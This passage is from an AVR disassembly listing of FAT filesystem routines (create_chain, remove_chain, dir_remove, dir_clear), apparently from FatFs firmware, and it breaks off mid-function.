    1e26:	cf 90       	pop	r12
    1e28:	bf 90       	pop	r11
    1e2a:	af 90       	pop	r10
    1e2c:	9f 90       	pop	r9
    1e2e:	8f 90       	pop	r8
    1e30:	7f 90       	pop	r7
    1e32:	6f 90       	pop	r6
    1e34:	5f 90       	pop	r5
    1e36:	4f 90       	pop	r4
    1e38:	08 95       	ret

00001e3a <create_chain>:
    1e3a:	4f 92       	push	r4
    1e3c:	5f 92       	push	r5
    1e3e:	6f 92       	push	r6
    1e40:	7f 92       	push	r7
    1e42:	8f 92       	push	r8
    1e44:	9f 92       	push	r9
    1e46:	af 92       	push	r10
    1e48:	bf 92       	push	r11
    1e4a:	cf 92       	push	r12
    1e4c:	df 92       	push	r13
    1e4e:	ef 92       	push	r14
    1e50:	ff 92       	push	r15
    1e52:	0f 93       	push	r16
    1e54:	1f 93       	push	r17
    1e56:	cf 93       	push	r28
    1e58:	df 93       	push	r29
    1e5a:	8c 01       	movw	r16, r24
    1e5c:	2a 01       	movw	r4, r20
    1e5e:	3b 01       	movw	r6, r22
    1e60:	fc 01       	movw	r30, r24
    1e62:	c0 81       	ld	r28, Z
    1e64:	d1 81       	ldd	r29, Z+1	; 0x01
    1e66:	41 15       	cp	r20, r1
    1e68:	51 05       	cpc	r21, r1
    1e6a:	61 05       	cpc	r22, r1
    1e6c:	71 05       	cpc	r23, r1
    1e6e:	99 f4       	brne	.+38     	; 0x1e96 <create_chain+0x5c>
    1e70:	8b 84       	ldd	r8, Y+11	; 0x0b
    1e72:	9c 84       	ldd	r9, Y+12	; 0x0c
    1e74:	ad 84       	ldd	r10, Y+13	; 0x0d
    1e76:	be 84       	ldd	r11, Y+14	; 0x0e
    1e78:	81 14       	cp	r8, r1
    1e7a:	91 04       	cpc	r9, r1
    1e7c:	a1 04       	cpc	r10, r1
    1e7e:	b1 04       	cpc	r11, r1
    1e80:	29 f1       	breq	.+74     	; 0x1ecc <create_chain+0x92>
    1e82:	8f 89       	ldd	r24, Y+23	; 0x17
    1e84:	98 8d       	ldd	r25, Y+24	; 0x18
    1e86:	a9 8d       	ldd	r26, Y+25	; 0x19
    1e88:	ba 8d       	ldd	r27, Y+26	; 0x1a
    1e8a:	88 16       	cp	r8, r24
    1e8c:	99 06       	cpc	r9, r25
    1e8e:	aa 06       	cpc	r10, r26
    1e90:	bb 06       	cpc	r11, r27
    1e92:	08 f5       	brcc	.+66     	; 0x1ed6 <create_chain+0x9c>
    1e94:	24 c0       	rjmp	.+72     	; 0x1ede <create_chain+0xa4>
    1e96:	11 de       	rcall	.-990    	; 0x1aba <get_fat>
    1e98:	62 30       	cpi	r22, 0x02	; 2
    1e9a:	71 05       	cpc	r23, r1
    1e9c:	81 05       	cpc	r24, r1
    1e9e:	91 05       	cpc	r25, r1
    1ea0:	08 f4       	brcc	.+2      	; 0x1ea4 <create_chain+0x6a>
    1ea2:	f5 c0       	rjmp	.+490    	; 0x208e <create_chain+0x254>
    1ea4:	6f 3f       	cpi	r22, 0xFF	; 255
    1ea6:	ff ef       	ldi	r31, 0xFF	; 255
    1ea8:	7f 07       	cpc	r23, r31
    1eaa:	8f 07       	cpc	r24, r31
    1eac:	9f 07       	cpc	r25, r31
    1eae:	09 f4       	brne	.+2      	; 0x1eb2 <create_chain+0x78>
    1eb0:	ff c0       	rjmp	.+510    	; 0x20b0 <create_chain+0x276>
    1eb2:	cf 88       	ldd	r12, Y+23	; 0x17
    1eb4:	d8 8c       	ldd	r13, Y+24	; 0x18
    1eb6:	e9 8c       	ldd	r14, Y+25	; 0x19
    1eb8:	fa 8c       	ldd	r15, Y+26	; 0x1a
    1eba:	6c 15       	cp	r22, r12
    1ebc:	7d 05       	cpc	r23, r13
    1ebe:	8e 05       	cpc	r24, r14
    1ec0:	9f 05       	cpc	r25, r15
    1ec2:	08 f4       	brcc	.+2      	; 0x1ec6 <create_chain+0x8c>
    1ec4:	f5 c0       	rjmp	.+490    	; 0x20b0 <create_chain+0x276>
    1ec6:	53 01       	movw	r10, r6
    1ec8:	42 01       	movw	r8, r4
    1eca:	09 c0       	rjmp	.+18     	; 0x1ede <create_chain+0xa4>
    1ecc:	81 2c       	mov	r8, r1
    1ece:	91 2c       	mov	r9, r1
    1ed0:	54 01       	movw	r10, r8
    1ed2:	83 94       	inc	r8
    1ed4:	04 c0       	rjmp	.+8      	; 0x1ede <create_chain+0xa4>
    1ed6:	81 2c       	mov	r8, r1
    1ed8:	91 2c       	mov	r9, r1
    1eda:	54 01       	movw	r10, r8
    1edc:	83 94       	inc	r8
    1ede:	6f 85       	ldd	r22, Y+15	; 0x0f
    1ee0:	78 89       	ldd	r23, Y+16	; 0x10
    1ee2:	89 89       	ldd	r24, Y+17	; 0x11
    1ee4:	9a 89       	ldd	r25, Y+18	; 0x12
    1ee6:	61 15       	cp	r22, r1
    1ee8:	71 05       	cpc	r23, r1
    1eea:	81 05       	cpc	r24, r1
    1eec:	91 05       	cpc	r25, r1
    1eee:	09 f4       	brne	.+2      	; 0x1ef2 <create_chain+0xb8>
    1ef0:	df c0       	rjmp	.+446    	; 0x20b0 <create_chain+0x276>
    1ef2:	84 14       	cp	r8, r4
    1ef4:	95 04       	cpc	r9, r5
    1ef6:	a6 04       	cpc	r10, r6
    1ef8:	b7 04       	cpc	r11, r7
    1efa:	09 f0       	breq	.+2      	; 0x1efe <create_chain+0xc4>
    1efc:	40 c0       	rjmp	.+128    	; 0x1f7e <create_chain+0x144>
    1efe:	75 01       	movw	r14, r10
    1f00:	64 01       	movw	r12, r8
    1f02:	2f ef       	ldi	r18, 0xFF	; 255
    1f04:	c2 1a       	sub	r12, r18
    1f06:	d2 0a       	sbc	r13, r18
    1f08:	e2 0a       	sbc	r14, r18
    1f0a:	f2 0a       	sbc	r15, r18
    1f0c:	8f 89       	ldd	r24, Y+23	; 0x17
    1f0e:	98 8d       	ldd	r25, Y+24	; 0x18
    1f10:	a9 8d       	ldd	r26, Y+25	; 0x19
    1f12:	ba 8d       	ldd	r27, Y+26	; 0x1a
    1f14:	c8 16       	cp	r12, r24
    1f16:	d9 06       	cpc	r13, r25
    1f18:	ea 06       	cpc	r14, r26
    1f1a:	fb 06       	cpc	r15, r27
    1f1c:	28 f0       	brcs	.+10     	; 0x1f28 <create_chain+0xee>
    1f1e:	c1 2c       	mov	r12, r1
    1f20:	d1 2c       	mov	r13, r1
    1f22:	76 01       	movw	r14, r12
    1f24:	68 94       	set
    1f26:	c1 f8       	bld	r12, 1
    1f28:	b7 01       	movw	r22, r14
    1f2a:	a6 01       	movw	r20, r12
    1f2c:	c8 01       	movw	r24, r16
    1f2e:	c5 dd       	rcall	.-1142   	; 0x1aba <get_fat>
    1f30:	61 30       	cpi	r22, 0x01	; 1
    1f32:	71 05       	cpc	r23, r1
    1f34:	81 05       	cpc	r24, r1
    1f36:	91 05       	cpc	r25, r1
    1f38:	09 f4       	brne	.+2      	; 0x1f3c <create_chain+0x102>
    1f3a:	ba c0       	rjmp	.+372    	; 0x20b0 <create_chain+0x276>
    1f3c:	6f 3f       	cpi	r22, 0xFF	; 255
    1f3e:	ef ef       	ldi	r30, 0xFF	; 255
    1f40:	7e 07       	cpc	r23, r30
    1f42:	8e 07       	cpc	r24, r30
    1f44:	9e 07       	cpc	r25, r30
    1f46:	09 f4       	brne	.+2      	; 0x1f4a <create_chain+0x110>
    1f48:	b3 c0       	rjmp	.+358    	; 0x20b0 <create_chain+0x276>
    1f4a:	67 2b       	or	r22, r23
    1f4c:	68 2b       	or	r22, r24
    1f4e:	69 2b       	or	r22, r25
    1f50:	19 f1       	breq	.+70     	; 0x1f98 <create_chain+0x15e>
    1f52:	8b 85       	ldd	r24, Y+11	; 0x0b
    1f54:	9c 85       	ldd	r25, Y+12	; 0x0c
    1f56:	ad 85       	ldd	r26, Y+13	; 0x0d
    1f58:	be 85       	ldd	r27, Y+14	; 0x0e
    1f5a:	82 30       	cpi	r24, 0x02	; 2
    1f5c:	91 05       	cpc	r25, r1
    1f5e:	a1 05       	cpc	r26, r1
    1f60:	b1 05       	cpc	r27, r1
    1f62:	88 f0       	brcs	.+34     	; 0x1f86 <create_chain+0x14c>
    1f64:	4f 89       	ldd	r20, Y+23	; 0x17
    1f66:	58 8d       	ldd	r21, Y+24	; 0x18
    1f68:	69 8d       	ldd	r22, Y+25	; 0x19
    1f6a:	7a 8d       	ldd	r23, Y+26	; 0x1a
    1f6c:	84 17       	cp	r24, r20
    1f6e:	95 07       	cpc	r25, r21
    1f70:	a6 07       	cpc	r26, r22
    1f72:	b7 07       	cpc	r27, r23
    1f74:	60 f0       	brcs	.+24     	; 0x1f8e <create_chain+0x154>
    1f76:	c1 2c       	mov	r12, r1
    1f78:	d1 2c       	mov	r13, r1
    1f7a:	76 01       	movw	r14, r12
    1f7c:	0d c0       	rjmp	.+26     	; 0x1f98 <create_chain+0x15e>
    1f7e:	c1 2c       	mov	r12, r1
    1f80:	d1 2c       	mov	r13, r1
    1f82:	76 01       	movw	r14, r12
    1f84:	09 c0       	rjmp	.+18     	; 0x1f98 <create_chain+0x15e>
    1f86:	c1 2c       	mov	r12, r1
    1f88:	d1 2c       	mov	r13, r1
    1f8a:	76 01       	movw	r14, r12
    1f8c:	05 c0       	rjmp	.+10     	; 0x1f98 <create_chain+0x15e>
    1f8e:	4c 01       	movw	r8, r24
    1f90:	5d 01       	movw	r10, r26
    1f92:	c1 2c       	mov	r12, r1
    1f94:	d1 2c       	mov	r13, r1
    1f96:	76 01       	movw	r14, r12
    1f98:	c1 14       	cp	r12, r1
    1f9a:	d1 04       	cpc	r13, r1
    1f9c:	e1 04       	cpc	r14, r1
    1f9e:	f1 04       	cpc	r15, r1
    1fa0:	c1 f5       	brne	.+112    	; 0x2012 <create_chain+0x1d8>
    1fa2:	75 01       	movw	r14, r10
    1fa4:	64 01       	movw	r12, r8
    1fa6:	ff ef       	ldi	r31, 0xFF	; 255
    1fa8:	cf 1a       	sub	r12, r31
    1faa:	df 0a       	sbc	r13, r31
    1fac:	ef 0a       	sbc	r14, r31
    1fae:	ff 0a       	sbc	r15, r31
    1fb0:	8f 89       	ldd	r24, Y+23	; 0x17
    1fb2:	98 8d       	ldd	r25, Y+24	; 0x18
    1fb4:	a9 8d       	ldd	r26, Y+25	; 0x19
    1fb6:	ba 8d       	ldd	r27, Y+26	; 0x1a
    1fb8:	c8 16       	cp	r12, r24
    1fba:	d9 06       	cpc	r13, r25
    1fbc:	ea 06       	cpc	r14, r26
    1fbe:	fb 06       	cpc	r15, r27
    1fc0:	60 f0       	brcs	.+24     	; 0x1fda <create_chain+0x1a0>
    1fc2:	22 e0       	ldi	r18, 0x02	; 2
    1fc4:	82 16       	cp	r8, r18
    1fc6:	91 04       	cpc	r9, r1
    1fc8:	a1 04       	cpc	r10, r1
    1fca:	b1 04       	cpc	r11, r1
    1fcc:	08 f4       	brcc	.+2      	; 0x1fd0 <create_chain+0x196>
    1fce:	64 c0       	rjmp	.+200    	; 0x2098 <create_chain+0x25e>
    1fd0:	c1 2c       	mov	r12, r1
    1fd2:	d1 2c       	mov	r13, r1
    1fd4:	76 01       	movw	r14, r12
    1fd6:	68 94       	set
    1fd8:	c1 f8       	bld	r12, 1
    1fda:	b7 01       	movw	r22, r14
    1fdc:	a6 01       	movw	r20, r12
    1fde:	c8 01       	movw	r24, r16
    1fe0:	6c dd       	rcall	.-1320   	; 0x1aba <get_fat>
    1fe2:	61 15       	cp	r22, r1
    1fe4:	71 05       	cpc	r23, r1
    1fe6:	81 05       	cpc	r24, r1
    1fe8:	91 05       	cpc	r25, r1
    1fea:	99 f0       	breq	.+38     	; 0x2012 <create_chain+0x1d8>
    1fec:	61 30       	cpi	r22, 0x01	; 1
    1fee:	71 05       	cpc	r23, r1
    1ff0:	81 05       	cpc	r24, r1
    1ff2:	91 05       	cpc	r25, r1
    1ff4:	09 f4       	brne	.+2      	; 0x1ff8 <create_chain+0x1be>
    1ff6:	5c c0       	rjmp	.+184    	; 0x20b0 <create_chain+0x276>
    1ff8:	6f 3f       	cpi	r22, 0xFF	; 255
    1ffa:	ef ef       	ldi	r30, 0xFF	; 255
    1ffc:	7e 07       	cpc	r23, r30
    1ffe:	8e 07       	cpc	r24, r30
    2000:	9e 07       	cpc	r25, r30
    2002:	09 f4       	brne	.+2      	; 0x2006 <create_chain+0x1cc>
    2004:	55 c0       	rjmp	.+170    	; 0x20b0 <create_chain+0x276>
    2006:	c8 14       	cp	r12, r8
    2008:	d9 04       	cpc	r13, r9
    200a:	ea 04       	cpc	r14, r10
    200c:	fb 04       	cpc	r15, r11
    200e:	59 f6       	brne	.-106    	; 0x1fa6 <create_chain+0x16c>
    2010:	47 c0       	rjmp	.+142    	; 0x20a0 <create_chain+0x266>
    2012:	0f ef       	ldi	r16, 0xFF	; 255
    2014:	1f ef       	ldi	r17, 0xFF	; 255
    2016:	98 01       	movw	r18, r16
    2018:	b7 01       	movw	r22, r14
    201a:	a6 01       	movw	r20, r12
    201c:	ce 01       	movw	r24, r28
    201e:	2a dc       	rcall	.-1964   	; 0x1874 <put_fat>
    2020:	81 11       	cpse	r24, r1
    2022:	0b c0       	rjmp	.+22     	; 0x203a <create_chain+0x200>
    2024:	41 14       	cp	r4, r1
    2026:	51 04       	cpc	r5, r1
    2028:	61 04       	cpc	r6, r1
    202a:	71 04       	cpc	r7, r1
    202c:	31 f0       	breq	.+12     	; 0x203a <create_chain+0x200>
    202e:	97 01       	movw	r18, r14
    2030:	86 01       	movw	r16, r12
    2032:	b3 01       	movw	r22, r6
    2034:	a2 01       	movw	r20, r4
    2036:	ce 01       	movw	r24, r28
    2038:	1d dc       	rcall	.-1990   	; 0x1874 <put_fat>
    203a:	81 11       	cpse	r24, r1
    203c:	22 c0       	rjmp	.+68     	; 0x2082 <create_chain+0x248>
    203e:	cb 86       	std	Y+11, r12	; 0x0b
    2040:	dc 86       	std	Y+12, r13	; 0x0c
    2042:	ed 86       	std	Y+13, r14	; 0x0d
    2044:	fe 86       	std	Y+14, r15	; 0x0e
    2046:	4f 85       	ldd	r20, Y+15	; 0x0f
    2048:	58 89       	ldd	r21, Y+16	; 0x10
    204a:	69 89       	ldd	r22, Y+17	; 0x11
    204c:	7a 89       	ldd	r23, Y+18	; 0x12
    204e:	8f 89       	ldd	r24, Y+23	; 0x17
    2050:	98 8d       	ldd	r25, Y+24	; 0x18
    2052:	a9 8d       	ldd	r26, Y+25	; 0x19
    2054:	ba 8d       	ldd	r27, Y+26	; 0x1a
    2056:	02 97       	sbiw	r24, 0x02	; 2
    2058:	a1 09       	sbc	r26, r1
    205a:	b1 09       	sbc	r27, r1
    205c:	84 17       	cp	r24, r20
    205e:	95 07       	cpc	r25, r21
    2060:	a6 07       	cpc	r26, r22
    2062:	b7 07       	cpc	r27, r23
    2064:	40 f0       	brcs	.+16     	; 0x2076 <create_chain+0x23c>
    2066:	41 50       	subi	r20, 0x01	; 1
    2068:	51 09       	sbc	r21, r1
    206a:	61 09       	sbc	r22, r1
    206c:	71 09       	sbc	r23, r1
    206e:	4f 87       	std	Y+15, r20	; 0x0f
    2070:	58 8b       	std	Y+16, r21	; 0x10
    2072:	69 8b       	std	Y+17, r22	; 0x11
    2074:	7a 8b       	std	Y+18, r23	; 0x12
    2076:	8c 81       	ldd	r24, Y+4	; 0x04
    2078:	81 60       	ori	r24, 0x01	; 1
    207a:	8c 83       	std	Y+4, r24	; 0x04
    207c:	c7 01       	movw	r24, r14
    207e:	b6 01       	movw	r22, r12
    2080:	17 c0       	rjmp	.+46     	; 0x20b0 <create_chain+0x276>
    2082:	81 30       	cpi	r24, 0x01	; 1
    2084:	89 f4       	brne	.+34     	; 0x20a8 <create_chain+0x26e>
    2086:	6f ef       	ldi	r22, 0xFF	; 255
    2088:	7f ef       	ldi	r23, 0xFF	; 255
    208a:	cb 01       	movw	r24, r22
    208c:	11 c0       	rjmp	.+34     	; 0x20b0 <create_chain+0x276>
    208e:	61 e0       	ldi	r22, 0x01	; 1
    2090:	70 e0       	ldi	r23, 0x00	; 0
    2092:	80 e0       	ldi	r24, 0x00	; 0
    2094:	90 e0       	ldi	r25, 0x00	; 0
    2096:	0c c0       	rjmp	.+24     	; 0x20b0 <create_chain+0x276>
    2098:	60 e0       	ldi	r22, 0x00	; 0
    209a:	70 e0       	ldi	r23, 0x00	; 0
    209c:	cb 01       	movw	r24, r22
    209e:	08 c0       	rjmp	.+16     	; 0x20b0 <create_chain+0x276>
    20a0:	60 e0       	ldi	r22, 0x00	; 0
    20a2:	70 e0       	ldi	r23, 0x00	; 0
    20a4:	cb 01       	movw	r24, r22
    20a6:	04 c0       	rjmp	.+8      	; 0x20b0 <create_chain+0x276>
    20a8:	61 e0       	ldi	r22, 0x01	; 1
    20aa:	70 e0       	ldi	r23, 0x00	; 0
    20ac:	80 e0       	ldi	r24, 0x00	; 0
    20ae:	90 e0       	ldi	r25, 0x00	; 0
    20b0:	df 91       	pop	r29
    20b2:	cf 91       	pop	r28
    20b4:	1f 91       	pop	r17
    20b6:	0f 91       	pop	r16
    20b8:	ff 90       	pop	r15
    20ba:	ef 90       	pop	r14
    20bc:	df 90       	pop	r13
    20be:	cf 90       	pop	r12
    20c0:	bf 90       	pop	r11
    20c2:	af 90       	pop	r10
    20c4:	9f 90       	pop	r9
    20c6:	8f 90       	pop	r8
    20c8:	7f 90       	pop	r7
    20ca:	6f 90       	pop	r6
    20cc:	5f 90       	pop	r5
    20ce:	4f 90       	pop	r4
    20d0:	08 95       	ret

000020d2 <remove_chain>:
    20d2:	4f 92       	push	r4
    20d4:	5f 92       	push	r5
    20d6:	6f 92       	push	r6
    20d8:	7f 92       	push	r7
    20da:	af 92       	push	r10
    20dc:	bf 92       	push	r11
    20de:	cf 92       	push	r12
    20e0:	df 92       	push	r13
    20e2:	ef 92       	push	r14
    20e4:	ff 92       	push	r15
    20e6:	0f 93       	push	r16
    20e8:	1f 93       	push	r17
    20ea:	cf 93       	push	r28
    20ec:	df 93       	push	r29
    20ee:	5c 01       	movw	r10, r24
    20f0:	6a 01       	movw	r12, r20
    20f2:	7b 01       	movw	r14, r22
    20f4:	b9 01       	movw	r22, r18
    20f6:	a8 01       	movw	r20, r16
    20f8:	fc 01       	movw	r30, r24
    20fa:	c0 81       	ld	r28, Z
    20fc:	d1 81       	ldd	r29, Z+1	; 0x01
    20fe:	f2 e0       	ldi	r31, 0x02	; 2
    2100:	cf 16       	cp	r12, r31
    2102:	d1 04       	cpc	r13, r1
    2104:	e1 04       	cpc	r14, r1
    2106:	f1 04       	cpc	r15, r1
    2108:	08 f4       	brcc	.+2      	; 0x210c <__stack+0xd>
    210a:	5d c0       	rjmp	.+186    	; 0x21c6 <__stack+0xc7>
    210c:	8f 89       	ldd	r24, Y+23	; 0x17
    210e:	98 8d       	ldd	r25, Y+24	; 0x18
    2110:	a9 8d       	ldd	r26, Y+25	; 0x19
    2112:	ba 8d       	ldd	r27, Y+26	; 0x1a
    2114:	c8 16       	cp	r12, r24
    2116:	d9 06       	cpc	r13, r25
    2118:	ea 06       	cpc	r14, r26
    211a:	fb 06       	cpc	r15, r27
    211c:	08 f0       	brcs	.+2      	; 0x2120 <__stack+0x21>
    211e:	55 c0       	rjmp	.+170    	; 0x21ca <__stack+0xcb>
    2120:	01 2b       	or	r16, r17
    2122:	02 2b       	or	r16, r18
    2124:	03 2b       	or	r16, r19
    2126:	39 f0       	breq	.+14     	; 0x2136 <__stack+0x37>
    2128:	0f ef       	ldi	r16, 0xFF	; 255
    212a:	1f ef       	ldi	r17, 0xFF	; 255
    212c:	98 01       	movw	r18, r16
    212e:	ce 01       	movw	r24, r28
    2130:	a1 db       	rcall	.-2238   	; 0x1874 <put_fat>
    2132:	81 11       	cpse	r24, r1
    2134:	51 c0       	rjmp	.+162    	; 0x21d8 <__stack+0xd9>
    2136:	b7 01       	movw	r22, r14
    2138:	a6 01       	movw	r20, r12
    213a:	c5 01       	movw	r24, r10
    213c:	be dc       	rcall	.-1668   	; 0x1aba <get_fat>
    213e:	2b 01       	movw	r4, r22
    2140:	3c 01       	movw	r6, r24
    2142:	61 15       	cp	r22, r1
    2144:	71 05       	cpc	r23, r1
    2146:	81 05       	cpc	r24, r1
    2148:	91 05       	cpc	r25, r1
    214a:	09 f4       	brne	.+2      	; 0x214e <__stack+0x4f>
    214c:	40 c0       	rjmp	.+128    	; 0x21ce <__stack+0xcf>
    214e:	61 30       	cpi	r22, 0x01	; 1
    2150:	71 05       	cpc	r23, r1
    2152:	81 05       	cpc	r24, r1
    2154:	91 05       	cpc	r25, r1
    2156:	e9 f1       	breq	.+122    	; 0x21d2 <__stack+0xd3>
    2158:	8f ef       	ldi	r24, 0xFF	; 255
    215a:	48 16       	cp	r4, r24
    215c:	58 06       	cpc	r5, r24
    215e:	68 06       	cpc	r6, r24
    2160:	78 06       	cpc	r7, r24
    2162:	c9 f1       	breq	.+114    	; 0x21d6 <__stack+0xd7>
    2164:	00 e0       	ldi	r16, 0x00	; 0
    2166:	10 e0       	ldi	r17, 0x00	; 0
    2168:	98 01       	movw	r18, r16
    216a:	b7 01       	movw	r22, r14
    216c:	a6 01       	movw	r20, r12
    216e:	ce 01       	movw	r24, r28
    2170:	81 db       	rcall	.-2302   	; 0x1874 <put_fat>
    2172:	81 11       	cpse	r24, r1
    2174:	31 c0       	rjmp	.+98     	; 0x21d8 <__stack+0xd9>
    2176:	8f 85       	ldd	r24, Y+15	; 0x0f
    2178:	98 89       	ldd	r25, Y+16	; 0x10
    217a:	a9 89       	ldd	r26, Y+17	; 0x11
    217c:	ba 89       	ldd	r27, Y+18	; 0x12
    217e:	4f 89       	ldd	r20, Y+23	; 0x17
    2180:	58 8d       	ldd	r21, Y+24	; 0x18
    2182:	69 8d       	ldd	r22, Y+25	; 0x19
    2184:	7a 8d       	ldd	r23, Y+26	; 0x1a
    2186:	6a 01       	movw	r12, r20
    2188:	7b 01       	movw	r14, r22
    218a:	e2 e0       	ldi	r30, 0x02	; 2
    218c:	ce 1a       	sub	r12, r30
    218e:	d1 08       	sbc	r13, r1
    2190:	e1 08       	sbc	r14, r1
    2192:	f1 08       	sbc	r15, r1
    2194:	8c 15       	cp	r24, r12
    2196:	9d 05       	cpc	r25, r13
    2198:	ae 05       	cpc	r26, r14
    219a:	bf 05       	cpc	r27, r15
    219c:	50 f4       	brcc	.+20     	; 0x21b2 <__stack+0xb3>
    219e:	01 96       	adiw	r24, 0x01	; 1
    21a0:	a1 1d       	adc	r26, r1
    21a2:	b1 1d       	adc	r27, r1
    21a4:	8f 87       	std	Y+15, r24	; 0x0f
    21a6:	98 8b       	std	Y+16, r25	; 0x10
    21a8:	a9 8b       	std	Y+17, r26	; 0x11
    21aa:	ba 8b       	std	Y+18, r27	; 0x12
    21ac:	8c 81       	ldd	r24, Y+4	; 0x04
    21ae:	81 60       	ori	r24, 0x01	; 1
    21b0:	8c 83       	std	Y+4, r24	; 0x04
    21b2:	73 01       	movw	r14, r6
    21b4:	62 01       	movw	r12, r4
    21b6:	44 16       	cp	r4, r20
    21b8:	55 06       	cpc	r5, r21
    21ba:	66 06       	cpc	r6, r22
    21bc:	77 06       	cpc	r7, r23
    21be:	08 f4       	brcc	.+2      	; 0x21c2 <__stack+0xc3>
    21c0:	ba cf       	rjmp	.-140    	; 0x2136 <__stack+0x37>
    21c2:	80 e0       	ldi	r24, 0x00	; 0
    21c4:	09 c0       	rjmp	.+18     	; 0x21d8 <__stack+0xd9>
    21c6:	82 e0       	ldi	r24, 0x02	; 2
    21c8:	07 c0       	rjmp	.+14     	; 0x21d8 <__stack+0xd9>
    21ca:	82 e0       	ldi	r24, 0x02	; 2
    21cc:	05 c0       	rjmp	.+10     	; 0x21d8 <__stack+0xd9>
    21ce:	80 e0       	ldi	r24, 0x00	; 0
    21d0:	03 c0       	rjmp	.+6      	; 0x21d8 <__stack+0xd9>
    21d2:	82 e0       	ldi	r24, 0x02	; 2
    21d4:	01 c0       	rjmp	.+2      	; 0x21d8 <__stack+0xd9>
    21d6:	81 e0       	ldi	r24, 0x01	; 1
    21d8:	df 91       	pop	r29
    21da:	cf 91       	pop	r28
    21dc:	1f 91       	pop	r17
    21de:	0f 91       	pop	r16
    21e0:	ff 90       	pop	r15
    21e2:	ef 90       	pop	r14
    21e4:	df 90       	pop	r13
    21e6:	cf 90       	pop	r12
    21e8:	bf 90       	pop	r11
    21ea:	af 90       	pop	r10
    21ec:	7f 90       	pop	r7
    21ee:	6f 90       	pop	r6
    21f0:	5f 90       	pop	r5
    21f2:	4f 90       	pop	r4
    21f4:	08 95       	ret

000021f6 <dir_remove>:
    21f6:	0f 93       	push	r16
    21f8:	1f 93       	push	r17
    21fa:	cf 93       	push	r28
    21fc:	df 93       	push	r29
    21fe:	ec 01       	movw	r28, r24
    2200:	08 81       	ld	r16, Y
    2202:	19 81       	ldd	r17, Y+1	; 0x01
    2204:	4e 89       	ldd	r20, Y+22	; 0x16
    2206:	5f 89       	ldd	r21, Y+23	; 0x17
    2208:	68 8d       	ldd	r22, Y+24	; 0x18
    220a:	79 8d       	ldd	r23, Y+25	; 0x19
    220c:	c8 01       	movw	r24, r16
    220e:	0e 94 68 08 	call	0x10d0	; 0x10d0 <move_window>
    2212:	81 11       	cpse	r24, r1
    2214:	07 c0       	rjmp	.+14     	; 0x2224 <dir_remove+0x2e>
    2216:	ea 8d       	ldd	r30, Y+26	; 0x1a
    2218:	fb 8d       	ldd	r31, Y+27	; 0x1b
    221a:	95 ee       	ldi	r25, 0xE5	; 229
    221c:	90 83       	st	Z, r25
    221e:	91 e0       	ldi	r25, 0x01	; 1
    2220:	f8 01       	movw	r30, r16
    2222:	93 83       	std	Z+3, r25	; 0x03
    2224:	df 91       	pop	r29
    2226:	cf 91       	pop	r28
    2228:	1f 91       	pop	r17
    222a:	0f 91       	pop	r16
    222c:	08 95       	ret

0000222e <dir_clear>:
    222e:	8f 92       	push	r8
    2230:	9f 92       	push	r9
    2232:	af 92       	push	r10
    2234:	bf 92       	push	r11
    2236:	cf 92       	push	r12
    2238:	df 92       	push	r13
    223a:	ef 92       	push	r14
    223c:	ff 92       	push	r15
    223e:	0f 93       	push	r16
    2240:	1f 93       	push	r17
    2242:	cf 93       	push	r28
    2244:	df 93       	push	r29
    2246:	7c 01       	movw	r14, r24
    2248:	4a 01       	movw	r8, r20
    224a:	5b 01       	movw	r10, r22
    224c:	0e 94 10 08 	call	0x1020	; 0x1020 <sync_window>
    2250:	81 11       	cpse	r24, r1
    2252:	39 c0       	rjmp	.+114    	; 0x22c6 <dir_clear+0x98>
    2254:	b5 01       	movw	r22, r10
    2256:	a4 01       	movw	r20, r8
    2258:	c7 01       	movw	r24, r14
    225a:	0e 94 28 07 	call	0xe50	; 0xe50 <clst2sect>
    225e:	4b 01       	movw	r8, r22
    2260:	5c 01       	movw	r10, r24
    2262:	f7 01       	movw	r30, r14
    2264:	67 a7       	std	Z+47, r22	; 0x2f
    2266:	70 ab       	std	Z+48, r23	; 0x30
    2268:	81 ab       	std	Z+49, r24	; 0x31
    226a:	92 ab       	std	Z+50, r25	; 0x32
    226c:	67 01       	movw	r12, r14
    226e:	f3 e3       	ldi	r31, 0x33	; 51
    2270:	cf 0e       	add	r12, r31
    2272:	d1 1c       	adc	r13, r1
    2274:	80 e0       	ldi	r24, 0x00	; 0
    2276:	92 e0       	ldi	r25, 0x02	; 2
    2278:	f6 01       	movw	r30, r12
    227a:	9c 01       	movw	r18, r24
    227c:	11 92       	st	Z+, r1
    227e:	21 50       	subi	r18, 0x01	; 1
    2280:	30 40       	sbci	r19, 0x00	; 0
    2282:	e1 f7       	brne	.-8      	; 0x227c <dir_clear+0x4e>
    2284:	c0 e0       	ldi	r28, 0x00	; 0
    2286:	d0 e0       	ldi	r29, 0x00	; 0
    2288:	01 c0       	rjmp	.+2      	; 0x228c <dir_clear+0x5e>
    228a:	21 96       	adiw	r28, 0x01	; 1
    228c:	f7 01       	movw	r30, r14
    228e:	81 85       	ldd	r24, Z+9	; 0x09
    2290:	92 85       	ldd	r25, Z+10	; 0x0a
    2292:	c8 17       	cp	r28, r24
    2294:	d9 07       	cpc	r29, r25
    2296:	70 f4       	brcc	.+28     	; 0x22b4 <dir_clear+0x86>
    2298:	01 e0       	ldi	r16, 0x01	; 1
    229a:	10 e0       	ldi	r17, 0x00	; 0
    229c:	a5 01       	movw	r20, r10
    229e:	94 01       	movw	r18, r8
    22a0:	2c 0f       	add	r18, r28
    22a2:	3d 1f       	adc	r19, r29
    22a4:	41 1d       	adc	r20, r1
    22a6:	51 1d       	adc	r21, r1
    22a8:	b6 01       	movw	r22, r12
    22aa:	81 81       	ldd	r24, Z+1	; 0x01
    22ac:	0e 94 ad 06 	call	0xd5a	; 0xd5a <disk_write>
    22b0:	88 23       	and	r24, r24
    22b2:	59 f3       	breq	.-42     	; 0x228a <dir_clear+0x5c>
    22b4:	f7 01       	movw	r30, r14
    22b6:	21 85       	ldd	r18, Z+9	; 0x09
    22b8:	32 85       	ldd	r19, Z+10	; 0x0a
    22ba:	81 e0       	ldi	r24, 0x01	; 1
    22bc:	c2 17       	cp	r28, r18
    22be:	d3 07       	cpc	r29, r19
    22c0:	19 f4       	brne	.+6      	; 0x22c8 <dir_clear+0x9a>
    22c2:	80 e0       	ldi	r24, 0x00	; 0
    22c4:	01 c0       	rjmp	.+2      	; 0x22c8 <dir_clear+0x9a>
    22c6:	81 e0       	ldi	r24, 0x01	; 1
    22c8:	df 91       	pop	r29
    22ca:	cf 91       	pop	r28
    22cc:	1f 91       	pop	r17
    22ce:	0f 91       	pop	r16
    22d0:	ff 90       	pop	r15
    22d2:	ef 90       	pop	r14
    22d4:	df 90       	pop	r13
    22d6:	cf 90       	pop	r12
    22d8:	bf 90       	pop	r11
